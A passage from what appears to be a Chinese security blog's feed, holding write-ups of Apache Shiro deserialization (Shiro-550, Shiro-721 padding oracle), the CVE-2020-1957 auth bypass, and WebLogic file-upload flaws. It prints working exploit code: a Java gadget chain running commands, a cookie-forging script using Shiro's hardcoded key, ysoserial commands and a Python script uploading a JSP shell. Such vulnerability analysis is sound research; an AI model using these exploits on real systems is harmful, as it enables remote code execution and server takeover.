class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(innermap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,templates);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">        array = (Object[]) f2.get(innimpl);</span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line">        </span><br><span class="line">        Field field0 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其产生的序列化后的数据，放入脚本中，生成cookie即可。脚本内容如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,<span class="string">'ysoserial.jar'</span>,<span class="string">'CommonsCollections5'</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s +((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">	key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">	mode = AES.MODE_CBC</span><br><span class="line">	iv = uuid.uuid4().bytes</span><br><span class="line">	encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">	file_body = pad(popen.stdout.read())</span><br><span class="line">	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">	<span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	command = <span class="string">"open /Applications/Calculator.app"</span></span><br><span class="line">	payload = encode_rememberme(command)</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"/Users/xxx/Desktop/payload.cookie"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">		print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()),file=fpw)</span><br></pre></td></tr></table></figure>

<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方修复的方式是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该问题。然而，一些开源系统会使用固定的编码，通过搜索引擎、github来收集密钥，或许可以对该漏洞进行成功利用。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">Java反序列化利用链分析之Shiro反序列化</a></li>
<li><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">Shiro-反序列化记录</a></li>
<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1957 Shiro权限绕过漏洞分析</title>
    <url>/2020/05/24/shiro-682/</url>
    <content><![CDATA[<p>该漏洞源自于shiro-682问题。即在spring框架下uri = uri + ‘/‘绕过shiro防护的问题。在shiro1.5.0版本进行修复。然而修复后的仍然可被绕过。这篇文章深入分析了Shiro这一漏洞。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>shiro &lt;= 1.5.1</li>
</ul>
<p>这次从shiro-682开始介绍。</p>
<h2 id="Shiro-682"><a href="#Shiro-682" class="headerlink" title="Shiro 682"></a>Shiro 682</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>shiro &lt; 1.5.0</li>
</ul>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在Spring web项目中，请求的URI如<code>/resource/menus</code>和<code>/resource/menus/</code>都可以访问到服务器的资源。但是Shiro中的URL路径表达式只能正确匹配到<code>/resource/menus</code>，而无法正确匹配到<code>/resource/menus/</code>，导致无法匹配进入到过滤链，从而绕过了Shiro的防护机制。</p>
<p>定位到<code>PathMatchingFilterChainResolver#getChain</code>函数。改函数作用即根据URL路径匹配中配置的URI路径表达式来匹配输入的URI，判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链，从而进入ShiroFilter执行。</p>
<p><img src="1.png" alt=""></p>
<p>跟进pathMatches函数，一直到<code>AntPathMatcher#doMatch</code>函数。</p>
<p><img src="2.png" alt=""></p>
<p><img src="3.png" alt=""></p>
<p>可以看到在这段逻辑中，当pattern为<code>/hello/*</code>，path为<code>/hello/1/</code>时，先从前往后进行匹配，到匹配<code>*</code>与<code>1</code>就结束了，然后接着往下走，从后往前匹配，这时候很显然匹配失败，因此不进入ShiroFilter链。</p>
<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p><img src="4.png" alt=""><br>从该补丁可以看出，当请求的URI以<code>/</code>结尾时，先去掉<code>/</code>再进行匹配。</p>
<h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>shiro &lt;= 1.5.1</li>
</ul>
<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>前面在shiro 1.5.0版本中已经修复了在后面加上<code>/</code>的绕过方式。而此次的绕过方式还是在<code>PathMatchingFilterChainResolver#getChain</code>函数中。</p>
<p><img src="5.png" alt=""></p>
<p>跟进getPathWithinApplication函数中。</p>
<p><img src="6.png" alt=""></p>
<p>调用getRequestUri()函数，进而调用decodeAndcleanUriString对uri进行清理。跟进它</p>
<p><img src="7.png" alt=""></p>
<p>在这里它会判断URI中是否含有<code>;</code>，若含有则，截取<code>;</code>之前的值作为URL。因此，对于<code>/xxx;/hello/1</code>，Shiro截取的结果为<code>/xxx</code>，从而匹配不成功。但是在spring中却直接获取到了后面的URI，从而绕过鉴权。</p>
<h3 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h3><p><img src="8.png" alt=""></p>
<p>在1.5.2版本中，将获取URI的方式从<code>request.getRequestURI</code>直接获取的方式改成获取request的<code>ContextPath</code>，<code>ServletPath</code>，<code>PathInfo</code>，然后再重新拼接而成。<br>对于<code>/xxx;/hello/1</code>，<code>ContextPath</code>，<code>ServletPath</code>，<code>PathInfo</code>分别为空，<code>/hello/1</code>，<code>/1</code>。拼接而成<code>//hello/1/1</code>。从而无法绕过了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此漏洞的成因主要是由于Shiro与Spring(Servlet)的拦截器对于URI模式匹配的差异，从而导致绕过。此外，还有undertow中的Filter与Controller对于URL解析不一致，从而可以通过/..;/绕过鉴权。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SHIRO-682" target="_blank" rel="noopener">SHIRO-682 fix the potential threat when use “uri = uri + ‘/‘ “ to bypassed shiro protect</a></li>
<li><a href="https://www.freebuf.com/vuls/231909.html" target="_blank" rel="noopener">Shiro权限绕过漏洞分析（CVE-2020-1957）</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro-721 Padding Oracle漏洞分析复现</title>
    <url>/2020/05/09/shiro-721/</url>
    <content><![CDATA[<p>shiro在经历了1.2.4硬编码密钥导致的反序列化漏洞之后，又被爆出新的RCE漏洞，还是在AES这个地方，编号为shiro-550。这篇文章复现并分析了该漏洞。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>shiro &lt;= 1.4.1</li>
</ul>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
<li>具有合法cookie值</li>
<li>能够对padding正确与否做出不同的响应</li>
</ul>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><ul>
<li>rememberMe</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Shrio所使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式，这使得该字段可以被Padding oracle攻击利用。攻击者可以使用一个合法有效的rememberMe cookie作为前缀来实施Padding Oracle，然后制造一个特定的rememberMe来执行Java反序列化攻击。  </p>
<p>复现的步骤如下:  </p>
<ul>
<li>成功登录网站并获取到rememberMe Cookie</li>
<li>使用这个合法Cookie作为前缀来进行Padding Oracle攻击</li>
<li>加密ysoserial反序列化payload来制作特定的rememberMe cookie</li>
<li>使用新的rememberMe cookie发起请求。</li>
</ul>
<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>大多数的Padding Oracle攻击都是用来获取明文的，后来提出了利用Padding Oracle加密任意明文的方法，其原理可从<a href="https://ananaskr.github.io/2020/05/08/padding-oracle/" target="_blank" rel="noopener">前面</a>文章中获取。要想利用此漏洞，有一个很关键的条件，目标系统需要对AES解密时padding正确与否，返回明确的信息，有点类似布尔盲注。</p>
<p>这次漏洞点和<a href="https://ananaskr.github.io/2020/05/08/shiro-550-attack/" target="_blank" rel="noopener">shiro-550</a>一样，还是出在了AES这个地方。让我们来跟进一下，是否满足AES解密padding正确与否时返回不同的信息。选择shiro的1.4.1版本。</p>
<p>首先确定一下AES解密失败padding的返回值。还是定位到<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code>方法，从这里一直到解密crypt函数，所经过的调用链如下图所示:</p>
<p><img src="2.png" alt=""></p>
<p>crypt函数中的处理如下所示：</p>
<p><img src="1.png" alt=""></p>
<p>如果解密cipher.dpFinal失败就会抛出异常，这个异常往上最终会被getRememberedPrincipals中捕获并进行处理。如下图所示:</p>
<p><img src="3.png" alt=""></p>
<p>会进入onRememberedPrincipalFailure函数进行处理，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>在此函数中获取到request和response，然后跟进forgetIdentity函数，</p>
<p><img src="5.png" alt=""></p>
<p>在forgetIdentity函数中将当前cookie值从request、response中删除。</p>
<p><img src="6.png" alt=""></p>
<p>跟进removeFrom函数可以看到，将cookie的rememeberMe字段值设置为deleteMe。</p>
<p><img src="7.png" alt=""></p>
<p>从上述分析中可以得知，当padding错误时，返回的cookie值是deleteMe。</p>
<p>然而到这里就结束了吗？并没有，如果走一遍流程就会发现，当反序列化发生错误时，最终也是调用到了removeFrom函数。因为convertBytesToPrincipals中也包含反序列化的操作。现在的情况就变成了:</p>
<ul>
<li>padding正确、反序列化正确 =&gt; rememberMe</li>
<li>padding正确、反序列化错误 =&gt; deleteMe</li>
<li>padding错误、反序列化正确 =&gt; deleteMe</li>
<li>padding错误、反序列化错误 =&gt; deleteMe</li>
</ul>
<p>为了消除反序列化错误对其的影响，每次请求的数据必须是能够正确反序列化的。本身padding oracle攻击并不需要一个合法有效的密文，但是在shiro场景下，为了能够正确反序列化，需要一个<font color=#008000>合法有效的cookie</font>。</p>
<p>在这里用到了一个java反序列化中的小trick，java中的ObjectOutputStream是一个stream，它会按照格式以队列的方式读下去，若后面拼接无关内容，是不会影响反序列化的。因此，在后面添加新的IV和密文，既能反序列化成功，又能验证padding是否正确。</p>
<blockquote>
<p>shiro接口在验证登录时有authc和user两种权限，authc是认证过，user是登录过。若开启了rememberMe功能，user可以通过，而authc不能通过。因此rememberMe只有在user权限的接口才有用。可以参考<a href="https://xz.aliyun.com/t/7207#toc-3" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a>。</p>
</blockquote>
<p>接下来的就是编写exp，然后进行padding oracle。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>进行漏洞利用时，环境选择shiro 1.4.1版本。</p>
<h2 id="获取明文"><a href="#获取明文" class="headerlink" title="获取明文"></a>获取明文</h2><p>首先获取要构造的明文。一段反序列化后能够执行命令的字节码。前面的文章介绍了wh1t3p1g师傅使用的一种方式，这次介绍另一种利用链构造方式，利用到了<font color=#008000>commons-beanutils</font>。同样地为了保持不受数组的影响，采用的命令执行点仍然是TemplatesImpl对象。只不过不再使用TransformingComparator而是<font color=#008000>BeanComparator</font>。这就是ysoserial中的<font color=#008000>CommonsBeanUtils1</font>。关于此利用链的分析可以从<a href="https://ananaskr.github.io/2020/05/09/ysoseial-commonsbeanutils1/" target="_blank" rel="noopener">ysoseial之CommonsBeanUtils1分析</a>中获取。</p>
<p>利用ysoseial首先生成所需要的明文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator &gt; payload.bin</span><br></pre></td></tr></table></figure>

<h2 id="获取密文"><a href="#获取密文" class="headerlink" title="获取密文"></a>获取密文</h2><p>然后在网上找了一个脚本<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">PaddingOracleAttack-Shiro-721</a>进行利用。执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br></pre></td></tr></table></figure>

<p>在实际中，执行了以下命令。</p>
<p><img src="8.png" alt=""></p>
<p>生成的密文结果如下:</p>
<p><img src="9.png" alt=""></p>
<p>然后将其作为新的rememberMe Cookie值，发送请求，结果如下</p>
<p><img src="10.png" alt=""></p>
<blockquote>
<p>在实际利用时，尽量选择简短的payload，这样有利于缩减爆破的时间。</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">RememberMe Padding Oracle Vulnerability</a></li>
<li><a href="https://xz.aliyun.com/t/7026" target="_blank" rel="noopener">Apacha-Shiro PaddingOracle 分析</a></li>
<li><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">Shiro Padding Oracle Attack 反序列化</a></li>
<li><a href="https://xz.aliyun.com/t/7207#toc-3" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic文件上传漏洞总结</title>
    <url>/2020/06/14/weblogic-upload/</url>
    <content><![CDATA[<p>WebLogic除了著名的T3反序列化漏洞、XMLDecoder反序列化漏洞以及XXE漏洞外，在其历史上也存在文件操作相关漏洞。</p>
<a id="more"></a>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>与文件上传漏洞相关的CVE有:</p>
<ul>
<li>CVE-2018-2894</li>
<li>CVE-2019-2618</li>
</ul>
<blockquote>
<p>其中后面出现的CVE-2019-2618利用起来相对严苛，因为它需要认证授权。</p>
</blockquote>
<p>文件上传的几个目录:</p>
<ul>
<li><p><code>\user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3/cmprq0/war/</code></p>
</li>
<li><p><code>bea_wls_internal</code></p>
</li>
<li><p><code>bea_wls_deployment_internal</code></p>
</li>
</ul>
<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞产生的原因是<font color=#008000>WebLogic管理端未授权 的两个页面存在任意文件上传漏洞</font>，分别是<font color=#008000>/ws_utc/begin.do</font>和<font color=#008000>/ws_utc/config.do</font>。上传webshell，能够getshell，直接获取权限。</p>
<p>受影响的版本:  </p>
<ul>
<li>12.1.3.0</li>
<li>12.2.1.2</li>
<li>12.2.1.3  </li>
</ul>
<blockquote>
<p>在10.3.6.0版本上并未发现Web服务测试页(Web Test Page)。</p>
</blockquote>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先需要登录后台，在<code>base_domain</code>的<code>配置</code>中选择<code>高级</code>，最后勾选<code>启用Web服务测试页</code>。本次复现的环境是12.1.3.0。<br><img src="1.png" alt=""></p>
<h4 id="config-do页面上传漏洞"><a href="#config-do页面上传漏洞" class="headerlink" title="config.do页面上传漏洞"></a>config.do页面上传漏洞</h4><p>将当前的工作目录切换到<code>user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3/cmprq0/war/</code>。</p>
<p>访问<code>/ws_utc/config.do</code>。点击左侧的”安全”菜单，添加体格Keystore，设置名字、密码。上传一个任意格式的文件。如下图所示:</p>
<p><img src="5.png" alt=""></p>
<p>然后抓包，查看响应中的timestamp的值，该值会作为后续的文件名中的一部分。</p>
<p><img src="6.png" alt=""></p>
<p>上传成功后，在浏览器中打开jsp文件。jsp文件在<code>/ws_utc/config/keystore/timestamp_cmd.jsp</code></p>
<p><img src="7.png" alt=""></p>
<p>如此，成功getshell。  </p>
<h4 id="begin-do页面上传漏洞"><a href="#begin-do页面上传漏洞" class="headerlink" title="begin.do页面上传漏洞"></a>begin.do页面上传漏洞</h4><p>讲工作目录切换到<code>\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</code>。</p>
<p><img src="2.png" alt=""></p>
<p>然后打开<code>/ws_utc/begin.do</code>页面。点击右上角的文件夹，上传shell文件。</p>
<p><img src="3.png" alt=""></p>
<p>抓包分析一下，定位到几个关键。</p>
<p><img src="8.png" alt=""></p>
<p>这里的name值import_file_name会变成最后的值。</p>
<p>那么上传之后的路径在哪儿呢？这就比config.do页面的上传路径更复杂些了。  </p>
<p>上传shell之后，虽然响应是500。但文件已经上传成功。  </p>
<p>然后在浏览器中打开，路径为<code>/bea_wls_internal/upload/RS_Upload_2020-06-16_12-20-21_667/import_file_name_cmd.jsp</code>。结果如下所示，也能getshell。</p>
<p><img src="11.png" alt=""></p>
<h3 id="漏洞简要分析"><a href="#漏洞简要分析" class="headerlink" title="漏洞简要分析"></a>漏洞简要分析</h3><h4 id="上传目录更改"><a href="#上传目录更改" class="headerlink" title="上传目录更改"></a>上传目录更改</h4><p>定位到<code>TestClientWorkDirManager#changeWorkDir()</code>方法。</p>
<p><img src="12.png" alt=""></p>
<p>当改变工作目录时，对传入的值未做任何的检测，导致可以更改任意上传目录。</p>
<h4 id="begin-do文件上传"><a href="#begin-do文件上传" class="headerlink" title="begin.do文件上传"></a>begin.do文件上传</h4><p>定位到RSDataHelper#convertFromMultiPart方法。</p>
<p><img src="9.png" alt=""></p>
<p>首先会判断是否存在upload目录，若不存在，则创建。并且将该目录下的所有文件清空。然后将当前的格式化后日期拼接在<code>RS_Upload_</code>后面作为upload目录下的目录名。</p>
<p>继续跟进进入convertFormDataMultiPart()方法。</p>
<p><img src="10.png" alt=""></p>
<p>在该函数里，它会从请求参数中，获得请求参数的key，将其作为文件名的前缀，即import_file_name拼接上传的文件名，作为最终的文件名。</p>
<h4 id="config-do文件上传"><a href="#config-do文件上传" class="headerlink" title="config.do文件上传"></a>config.do文件上传</h4><p>定位到SettingResource#editKeyStoreSettingByMultiPart方法。<br><img src="13.png" alt=""></p>
<p>然后跟进convertFormDataMultiPart()方法，进入到了RSDataHelper#convertFormDataMultiPart()方法。这就到了和begin.do一样的地方了。只不过key的值不一样。即前缀不一样。</p>
<h2 id="CVE-2019-2618"><a href="#CVE-2019-2618" class="headerlink" title="CVE-2019-2618"></a>CVE-2019-2618</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞利用条件比较严苛，需要认证。漏洞存在于WebLogic组件中的DeploymentService接口。DeploymentService接口的正常功能就是部署war包。攻击者，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而获取服务器权限。</p>
<p>影响版本:</p>
<ul>
<li>10.3.6.0</li>
<li>12.1.3.0</li>
<li>12.2.1.3</li>
</ul>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>向路径<code>/bea_wls_deployment_internal/DeploymentService</code>发送POST数据包。</p>
<p>利用python脚本来实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService&quot;</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">	&quot;username&quot;:&quot;weblogic&quot;,</span><br><span class="line">	&quot;wl_request_type&quot;:&quot;app_upload&quot;,</span><br><span class="line">	&quot;cache-control&quot;:&quot;no-cache&quot;,</span><br><span class="line">	&quot;wl_upload_application_name&quot;:&quot;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal&#x2F;gyuitk&#x2F;war&quot;,</span><br><span class="line">	&quot;serverName&quot;:&quot;weblogic&quot;,</span><br><span class="line">	&quot;password&quot;:&quot;209631qkl&quot;,</span><br><span class="line">	&quot;wl_upload_delta&quot;:&quot;true&quot;,</span><br><span class="line">	&quot;server_version&quot;:&quot;12.1.3.0&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&#39;file&#39;:open(&#39;cmd.jsp&#39;,&#39;rb&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url,files&#x3D;files,headers&#x3D;header)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>网上<a href="https://github.com/jas502n/cve-2019-2618/blob/master/cve-2019-2618.py" target="_blank" rel="noopener">jas502n</a>师傅也提供了更加完善的EXP以供使用。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞的关键点在于上传war包的地方。上传的内容是可控的。定位到<code>weblogic.deploy.service.internal.transport.http.DeploymentServiceServlet#handlePlanOrApplicationUpload()</code>。</p>
<p><img src="4-3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">WebLogic两处任意文件上传漏洞动态分析（CVE-2018-2894）</a></li>
<li><a href="https://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/" target="_blank" rel="noopener">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a></li>
<li><a href="https://www.freebuf.com/column/205469.html" target="_blank" rel="noopener">CVE-2018-2894漏洞分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
